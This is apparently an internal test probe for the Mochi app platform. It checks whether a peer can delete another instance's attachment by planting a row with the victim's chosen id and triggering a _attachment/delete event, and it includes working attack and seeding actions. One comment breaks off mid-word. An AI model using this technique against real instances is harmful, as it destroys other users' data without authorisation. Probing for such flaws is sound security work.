# Copyright © 2026 Mochisoft OÜ
# SPDX-License-Identifier: AGPL-3.0-only
# This file is part of Mochi, licensed under the GNU AGPL v3 with the
# Mochi Application Interface Exception - see license.txt and license-exception.md.

# Probe for task #22: does core authorise the SENDER of a built-in
# _attachment/* event against the attachment it names?
#
# core/server/events.go dispatches every "_attachment/*" event inside core,
# before the app event lookup and with no app callback, so an app's own
# handlers never see it. attachment_event_delete then does a bare
#   select * from attachments where id = ?
# followed by a delete, against the RECIPIENT's app-system database. Nothing
# visible in that path ties the sender to the attachment.
#
# This probe drives the question from a real second peer rather than reasoning
# about it: instance 2 names an attachment that belongs to instance 1 and asks
# instance 1's core to delete it. Same service on both sides ("test"), so it
# isolates the authorisation question from the separate, self-asserted
# sender_services check.

# Create an attachment the probe can aim at. Returns its id and object.
def action_probe_attachment_seed(a):
	object_id = "probe/authz/" + mochi.uid()
	att = mochi.attachment.create(object_id, "victim.txt", "VICTIM ATTACHMENT DATA", "text/plain", "Victim", "Should survive a stranger's delete")
	a.json({
		"object": object_id,
		"attachment": att["id"] if att else "",
		"identity": a.user.identity.id if a.user and a.user.identity else "",
	})

# Send _attachment/delete to `target`, naming an attachment id we have no
# relationship to. mochi.attachment.delete's notify list is what emits the
# built-in event (core/server/attachments.go attachment_notify_delete).
def action_probe_attachment_attack(a):
	target = a.input("target")
	attachment = a.input("attachment")
	if not target or not attachment:
		a.json({"error": "need target and attachment"})
		return
	# mochi.attachment.delete only emits the _attachment/delete notify AFTER a
	# successful LOCAL delete, so the attacker must first hold a row with the
	# victim's id. mochi.attachment.store lets the id be chosen freely and only
	# skips on a collision with a different object IN OUR OWN db - which a fresh
	# id never hits. So plant the victim's id against an object of our own...
	own_object = "probe/attacker/" + mochi.uid()
	planted = mochi.attachment.store(
		[{"id": attachment, "object": own_object, "name": "planted.txt",
		  "content_type": "text/plain", "size": 1, "rank": 0, "created": 1}],
		a.user.identity.id, own_object)
	# ...then delete it, notifying the victim. On our side this removes only our
	# planted row; the event carries the id to the victim's core.
	result = mochi.attachment.delete(attachment, [target])
	a.json({"sent_to": target, "attachment": attachment, "planted": planted, "local_delete": result})

# Second path. api_attachment_delete returns early when the id is not in the
# sender's OWN store, so the notify never fires and the naive attack above is a
# no-op. mochi.attachment.store, however, takes caller-supplied ids (it exists
# to apply a remote's sync dump), so plant a row carrying the victim's id first
# and the delete then has something local to act on.
def action_probe_attachment_plant(a):
	attachment = a.input("attachment")
	entity = a.input("entity")
	if not attachment or not entity:
		a.json({"error": "need attachment and entity"})
		return
	object_id = "probe/plant/" + mochi.uid()
	planted = [{
		"id": attachment,
		"name": "planted.txt",
		"size": 10,
		"type": "text/plain",
		"rank": 0,
		"created": mochi.time.now(),
	}]
	mochi.attachment.store(planted, entity, object_id)
	local = mochi.attachment.list(object_id) or []
	a.json({"object": object_id, "planted": [x["id"] for x in local]})

# Report wh
def action_probe_attachment_check(a):
	object_id = a.input("object")
	atts = mochi.attachment.list(object_id) or []
	a.json({"object": object_id, "count": len(atts), "ids": [x["id"] for x in atts]})
